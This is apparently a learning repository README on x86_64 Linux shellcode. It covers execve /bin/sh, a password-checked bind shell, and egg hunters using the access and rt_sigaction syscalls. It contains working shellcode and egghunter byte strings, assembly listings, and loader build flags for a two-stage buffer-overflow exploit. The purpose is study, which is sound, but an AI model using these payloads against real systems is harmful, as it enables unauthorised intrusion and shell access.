# Shellcode

For the purpose of learning how to shellcode

## Getting Started

To invoke syscall in assembly at x86_64 Linux system, syscall number placed in RAX register, and rest of arguments put into registers with following order RDI, RSI, RDX, R10, R8, R9.

[64-bit syscall numbers](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl)

[Useful syscall table](https://filippo.io/linux-syscall-table/) By filippo

## Launch /bin/sh

To launch another program from assembly, we use execve syscall to launch that specific program. Since execve's syscall number is 59, then the register RAX needs to hold [59](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl) when invoking syscall. Based on the man page of `execve`, in order to invoke `execve` it needs three arguments, each was: First, the memory address that holding the pathname of the program caller wants to run. Second, the address that holding the address of pathname to invoke. Third, memory address of environment parameters. Hence, the RDI hold the memory address to the pathname, RSI holds the address to the address of the pathname, since there is no need to pass envp to launch a program, register RDX can be simply set to 0, in assembly, use `xor rdx, rdx` to set rdx to 0. All the arguments need to be null-terminated.

Strings store in stack in little-endian format, plus in 64-bit system, stack can hold 8 bytes, `/bin/sh` takes 7 bytes, add an additional forward slash didn't compromise functionality but filling exactly 8 bytes into the stack.

Use Python to get hexadecimal of `/bin//sh` in little endian format:

**From Interpreter:**

Python3

```python
>>> '/bin//sh'[::-1].encode().hex()
'68732f2f6e69622f'
```

Python2

```python
>>> '/bin//sh'[::-1].encode('hex')
'68732f2f6e69622f'
```

Stack layout before invoking syscall:

```assembly
          Memory address          Stack
                           +------------------+
               ....        |       ....       | 
                           +------------------+
 rsi => 0x00007fffffffe0d0 |0x00007fffffffe0e0|
                           +------------------+
        0x00007fffffffe0d8 |0x0000000000000000|
                           +------------------+
 rdi => 0x00007fffffffe0e0 |0x68732f2f6e69622f|
                           +------------------+
        0x00007fffffffe0e8 |0x0000000000000000|
                           +------------------+
                ....       |       ....       |
                           +------------------+
```

## Bind TCP Shell with password

After connection established, stdin, stdout, stderr are all redirect to this established connection we ask user for passcode to authenticate whether the current user is legitimate or not.

### Password prompt

Program print "ask for passcode" prompt to screen and wait for user input. The print prompt can be done by invoking [write(1)](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl) syscall, for the read input part, it can be done by invoking [read(0)](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl) syscall. As for the string storage, we can hard code string into assembly code, but there is length limitation. Say once shell established, program print `Password: ` which takes 10 bytes to represent, if goes for hardcoded option the assembly code would be like, take 2 of 10 bytes from prompt store it to RAX, push it into the stack, then take rest 8 bytes store it in RAX, again push it into the stack, now rsp has pointed to the prompt we want to print out. Since write syscall takes three arguments which were `file descriptor`, `memory address to the output string`, `length of that string`. So, register RDI, RSI, RDX each were responsible for those arguments, simply `mov rsi rsp` to let RSI hold the address to the prompt, then set RDI to 1 which represents standard output, finally set RDI to 10 which clearly means the length.

The first fragment(2 bytes) `: ` in hexadecimal `0x203a`, when it gets to pushed into stack it will auto null-terminated and look like this `0x000000000000203a`. Then, second fragment(8 bytes) `Password` in hexadecimal `0x64726f7773736150`.

```assembly 
mov eax, 0x203a
push rax
mov rax, 0x64726f7773736150
push rax
```

Use GDB to check stack:

```shell
(gdb) x/4gx $rsp

0x7fffffffdf68:	0x64726f7773736150	0x00000000000a203a
0x7fffffffdf78:	0x0000000000000000	0x0000000000000001
```

Then, move `rsp` to `rsi` to hold the reference to the string to print, increment `rdx` to 10 which stand for string length.

```assembly
mov rsi rsp
xor rdx rdx
add rdx 10
```

Finally, set `rax` to 1 for the [write(1)](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl) syscall number, and set `rdi` to 1 which stand for stdout, and invoke syscall.

```assembly
xor rax, rax
add rax, 1
mov rdi, rax
syscall
```

### Input password authentication

Once password prompt printed, the program waits for the user to provide a password for further operation. To implement this use read(0) syscall to read user input.

Based on the definition:

```c
       #include <unistd.h>

       ssize_t read(int fd, void *buf, size_t count);
```

So, `read()` will read `count` size of bytes from file descriptor `fd` into the `buf`. Now, map this to assembly will have register RDI holds file descriptor `fd` which will be `0` for stdin, register RSI holds `*buf` which will be memory address of buffer which we will get from decrement certain size of buffer from stack, then assign RSP to RSI, and finally, register RDX will specify the size of input to read from `fd` to buffer.

Set test password to `kkkkkkkk` which takes 8 bytes, with hexadecimal little endian format `0x6b6b6b6b6b6b6b6b`.

With that being said, assembly code goes like this:

```assembly
xor rax, rax ; set syscall number to 0
mov rdi, rax ; set stdin
sub rsp, 8   ; set buffer
mov rsi, rsp ; assgin buffer address to rsi
mov dl, 8    ; read 8 bytes from stdin
syscall
```

Then the program will wait for user input, once the user hits enter, the program continues to execute to proceed string compare. Now, RSI point to the buffer that filled with user input, hence we load it into one register to compare whether it matches the password or not.

First, we load hexadecimal representation of password `0x6b6b6b6b6b6b6b6b` into rax, then load buffer which RSI pointed to into the RDI register, and proceed string compare, if it's zero means their matches, then launch shell for the user, otherwise, program proceeds to shut down the connection.

```assembly
...
mov rax, 0x6b6b6b6b6b6b6b6b ; load password "kkkkkkkk"
mov rdi, [rsi]              ; load user input
xor rax, rdi                ; xor user input again password, result either be zero or not zero
xor rdi, rdi                ; set 0
cmp rax, rdi                ; if matches rax would be zero, then `je` will take

je shell                    ; if equal then jump to shell, which is the same code from execve_sh.asm

... exit code
```

## Reverse TCP Shell with password

Authentication part is identical to bind TCP shell.

## Egg hunter

Compare to x86 system, egg hunt under x86_64 system is relatively slow. In order to speed up common egg hunt proof of concept operation, using gdb to modify the value of RDX register which in our case is the pointer register that hold the value of virtual memory address space from `0x0000000000000000` all the way to `0x00007fffffffffff`.

Based on the original egghunt paper writen by [mmiller@hick.org] there are two way to accomplish egghunt under Linux system which are access, sigaction syscall.

Given such a scenerio, a programme has a Buffer over flow vulnerability, while unfortunatily there is limited space for attacker to exploit this access point, then we split our exploit into two stag. The first stage contain shellcode that exploit this vulnerability, but has a specifically chosen code (egg) append at the beginning of our shellcode.

Stage 1:

	First send payload shellcode (1) into vulnerable program.

	|Egg|Shellcode| => Vulnerable program

	After that, the virtual address space of this specific program will contain our shellcode and wait for us to find.

Stage 2:

	Send egghunter shellcode (2) into vulnerable program, this tiny shellcode will go ahead to scan all the virtual memory address space of target system to locate unique egg.

	From page to page, once egghunter successfully locate egg, then we can jump into this exploit shellcode we planted at stage 1.

### Implement with access syscall

#### Proof of concept workthrough

Use execve_sh.asm as test shellcode, which will launch an interactive shell.

Compile shellcode:

```shell
$ nasm -felf64 execve_sh.asm -o shell.o
```

Use objdump to check if there is any null byte remained (loader is writen in C, which use null byte as string terminater symbol, in that case we don't want any null byte presence in our shellcode):

```shell
$ objdump -M intel -D shell.o
```

Extract shellcode:

```shell
$ bash gen.sh shell.o
```

Use egghunter1.asm as test egghunter, which implemented egg hunt by evoking access syscall.

Compile egghunter:

```shell
$ nasm -felf64 egghunter1.asm -o egghunter.o
```

Use objdump to check if there is any null byte remained:

```shell
$ objdump -M intel -D egghunter.o
```

Extract egghunter:

```shell
$ bash gen.sh egghunter.o
```

Shellcode(egg: `\x90\x50\x90\x50\x90\x50\x90\x50`):

```
\x90\x50\x90\x50\x90\x50\x90\x50\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05
```

Egghunter:

```
\xbb\x90\x50\x90\x50\x48\x31\xc9\x48\xf7\xe1\x66\x81\xca\xff\x0f\x48\xff\xc2\x50\x53\x51\x52\x57\x56\x48\x31\xf6\x48\x8d\x7a\x04\xb0\x15\x0f\x05\x3c\xf2\x5e\x5f\x5a\x59\x5b\x58\x74\xdd\x39\x1a\x75\xde\x39\x5a\x04\x75\xd9\xff\xe2\x48\x31\xc0\x48\x83\xc0\x3c\x0f\x05
```

Put these two shellcode string into loader.c

Compile loader.c:

```shell
$ gcc -fno-stack-protector -z execstack loader.c -o loader
```

Validate egghunter:

```shell
$ gdb -q ./loader -tui
```

Set disassembly flavor:

```
(gdb) set disassembly-flavor intel
```

Set break point:

```
(gdb) break main
```

Because of ASLR, the address of egg + shellcode is randomized at runtime, that is why we need gdb to find address of implanted shellcode to speed up this operation.

After several continue:

```assembly
> 0x55555555806b <egghunter+11>   or     dx,0xfff
  0x555555558070 <egghunter+16>   inc    rdx
       ....
  0x555555558073 <egghunter+19>   push   rax
  0x555555558078 <egghunter+24>   push   rsi
  0x555555558079 <egghunter+25>   xor    rsi,rsi
  0x55555555807c <egghunter+28>   lea    rdi,[rdx+0x4]
  0x555555558080 <egghunter+32>   mov    al,0x15
  0x555555558082 <egghunter+34>   syscall
  0x555555558084 <egghunter+36>   cmp    al,0xf2
       ....
```

Now egghunter about to execute `or dx, 0xfff` to switch to another memory page.

Query memory address of shellcode variable:

```
(gdb) info variables shellcode
```

```
0x0000555555558020  shellcode
```
The result may vary each time loader runs, which is the purpose of ASLR

Intentionally set register RDI to point to exact memory page which contain previous implanted egg:

```
(gdb) set $rdi = 0x0000555555558020
```

Now presumably egghunter is at correct memory page, then address `0x0000555555558020` will look like this:

```assembly
0x0000555555558020 0x5090509050905090 <- egg
0x0000555555558028 0x622fbb4850c03148 <- shellcode
0x0000555555558030 0x485368732f2f6e69
       ....               ....
[ higher address ] [    shellcode   ]
```

Pointer surpass 4 bytes to check given address at RDI is accessible or not. If succeed then previous 4 bytes is accessible as well. After that, egghunter go ahead to validate egg string. Again, egghunter check 4 bytes from RDI which is `0x50905090` to see if this 4 bytes match ebx or not, then proceed to check next 4 bytes against ebx. If all succeed, means egghunter now locate correct egg. Therefore, jmp into RDI, which are essentailly several `nop` and `push` instruction, and finally slide into real shellcode.

Instead of mannuly check 4 bytes from RDX then move to next 4 bytes, we can replace it with `scasd` instruction which compare rdx against rax in 4 bytes length, after that it will automatically increment RDX to check next 4 bytes.

More simplifid assembly code:

```assembly
...

xor rsi, rsi                  xor rax, rax
lea rdi, [rdx+0x4]            xor rsi, rsi
mov al, 21                    lea rdi, [rdx+0x4]
syscall                       mov al, 21
                              syscall
cmp al, 0xf2                  cmp al, 0xf2
                              jz switch_page
...
                              ; half egg
jz switch_page                mov eax, 0x50905090
                              mov rdi, rdx
cmp dword [rdx], ebx      =>  scasd
jnz scan_page                 jnz scan_page

cmp dword [rdx+0x4], ebx  =>  scasd
jnz scan_page                 jnz scan_page
jmp rdx                       jmp rdi
```

### Implement with sigaction(rt_sigaction)

Sigaction under 64 bit had forth argument based on the man page from [here](https://man7.org/linux/man-pages/man2/sigaction.2.html)
> The original Linux system call was named sigaction(). However, with the addition of real-time signals in Linux 2.2, the fixed-size, 32-bit sigset_t type supported by that system call was no longer fit for purpose. Consequently, a new system call, rt_sigaction(), was added to support an enlarged sigset_t type. The new system call takes a fourth argument, size_t sigsetsize, which specifies the size in bytes of the signal sets in act.sa_mask and oldact.sa_mask. This argument is currently required to have the value sizeof(sigset_t) (or the error EINVAL results). The glibc sigaction() wrapper function hides these details from us, transparently calling rt_sigaction() when the kernel provides it.

[Definition snippet](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/signal.c#n4225):

```c
#ifndef CONFIG_ODD_RT_SIGACTION
/**
 *  sys_rt_sigaction - alter an action taken by a process
 *  @sig: signal to be sent
 *  @act: new sigaction
 *  @oact: used to save the previous sigaction
 *  @sigsetsize: size of sigset_t type
 */
SYSCALL_DEFINE4(rt_sigaction, int, sig,
		const struct sigaction __user *, act,
		struct sigaction __user *, oact,
		size_t, sigsetsize)
{
	struct k_sigaction new_sa, old_sa;
	int ret;

	/* XXX: Don't preclude handling different sized sigset_t's.  */
	if (sigsetsize != sizeof(sigset_t))
		return -EINVAL;

	if (act && copy_from_user(&new_sa.sa, act, sizeof(new_sa.sa)))
		return -EFAULT;

	ret = do_sigaction(sig, act ? &new_sa : NULL, oact ? &old_sa : NULL);
	if (ret)
		return ret;

	if (oact && copy_to_user(oact, &old_sa.sa, sizeof(old_sa.sa)))
		return -EFAULT;

	return 0;
}
```

The arguments for this function can be translated as `sig` being in the RDI register, memory address of struct `act` being in the RSI register, and memory address of struct `oact` being in the RDX register, and forth argument as `sigsetsize` being in the R10 register to pass first if condition check. The RAX register will again hold the system call number which is [13](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl):

The sigaction structure is defined as follow:

```c
    struct sigaction {
        void     (*sa_handler)(int);
        void     (*sa_sigaction)(int, siginfo_t *, void *);
        sigset_t   sa_mask;
        int        sa_flags;
        void     (*sa_restorer)(void);
    };
```

Implementation assembly:

```assembly
switch_page:

	or si, 0xfff

scan_page:

	inc rsi

	xor rax, rax
	add rax, 13
	xor r10, r10
	add r10, 8
	syscall

	cmp al, 0xf2
	jz switch_page

	mov eax, 0x50905090
	mov rdi, rsi
	scasd
	jnz scan_page

	scasd
	jnz scan_page
	jmp rsi
```

The major difference between 32-bit and 64-bit egg hunter implemented by using sigaction is in 64-bit version, sigaction or rt_sigaction takes an additional argument to check sigsetsize, while this specific argument is auto calculate in 32-bit version. In 64 bit version, we have to provide a  reasonable sigsetsize to pass the first if condition check [1], otherwise egghunter will always throw -EINVAL error, then we will not being able to proceed egg hunting, Since, the purpose of using sigaction syscall is to exploit EFAULT error return.

```
{
	struct k_sigaction new_sa, old_sa;
	int ret;

	/* XXX: Don't preclude handling different sized sigset_t's.  */
	if (sigsetsize != sizeof(sigset_t))  // <===== [1] Here check sigsetsize
		return -EINVAL;

	if (act && copy_from_user(&new_sa.sa, act, sizeof(new_sa.sa)))
		return -EFAULT;

	ret = do_sigaction(sig, act ? &new_sa : NULL, oact ? &old_sa : NULL);
	if (ret)
		return ret;

	if (oact && copy_to_user(oact, &old_sa.sa, sizeof(old_sa.sa)))
		return -EFAULT;

	return 0;
}
```

With that being said, we use register R10 to fill an addition argument:

```assembly
	xor rax, rax
	add rax, 13
	xor r10, r10
	add r10, 8   ; <=== set sigsetsize (take whatever number you want)
	syscall
```

Now egghunter will able to loop from page to page to locate implanted egg to detonate real shellcode.
